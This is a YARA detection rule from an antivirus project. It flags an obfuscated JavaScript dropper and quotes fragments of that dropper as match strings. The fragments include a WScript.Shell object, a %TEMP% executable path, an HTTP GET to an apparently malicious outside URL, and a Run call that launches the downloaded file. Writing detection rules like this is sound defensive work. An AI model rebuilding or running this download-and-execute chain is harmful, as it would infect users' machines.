rule sig_20160329_4950fd6bdd45fea39cea5474b479c733 {
  meta:
    description = "datamaliciousorder - file 20160329_4950fd6bdd45fea39cea5474b479c733.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5e04a445817dffa40d72d3cd8f30ec9ede4fe91a5a3ea475e99446e2d852f4d8"

  strings:
    $s1  = "function Ujgpzuqkd() {return Kpllgkiulh[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"WxKbhzJYTrW1RXc.exe\";};" fullword ascii
    $s2  = "Mlfotusb[Vaxlmlbwiv](\"GET\", \"http://www.suansawanresort.com/n7eua\", false);" fullword ascii
    $s3  = "function Easfihooz(Yfptzxok, Rswhuoaksw){return Yfptzxok - Rswhuoaksw;};" fullword ascii
    $s4  = "var Kpllgkiulh = function Txnvhgelc() {return WScript[Umdedossm](\"WScript.Shell\");}();" fullword ascii
    $s5  = "do {WScript[Cqcailsssg](Wdski() * 11)} while (Mlfotusb[\"readystate\"] < 4 );" fullword ascii
    $s6  = "function Wvadqg() {return ((Nstcypmqlk == true) && (Nstcypmqlk == Fdvytzvu)) ? 1 : Fljmc;};" fullword ascii
    $s7  = "function Oktkhnsvs(Ecqgbmb){Kpllgkiulh[\"Run\"](Ecqgbmb, Fljmc, Fljmc);};" fullword ascii
    $s8  = "function Wdski(){return 22;};" fullword ascii
    $s9  = "function Ehschme()" fullword ascii
    $s10 = "var Nstcypmqlk = false;" fullword ascii
    $s11 = "var Fdvytzvu = false;" fullword ascii
    $s12 = " while (Lwpnuaihvm){" fullword ascii
    $s13 = "var Jjzcj = new this[\"Date\"]();" fullword ascii
    $s14 = "function Xxtpazhrwl(){return Umdedossm;};" fullword ascii
    $s15 = "function Rfkutowdgq(){return Buvekhpj;};" fullword ascii
    $s16 = "Nstcypmqlk = true; " fullword ascii
    $s17 = "function Ujqne(Hckpxfyp) {var Tgdtflqf = (1, 2, 3, 4, 5, Hckpxfyp); return Tgdtflqf;};" fullword ascii
    $s18 = "var Dvecvefghc = false;" fullword ascii
    $s19 = "Fdvytzvu = true; " fullword ascii
    $s20 = "return Easfihooz(Yxajfbta, Dvmsajqbww);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}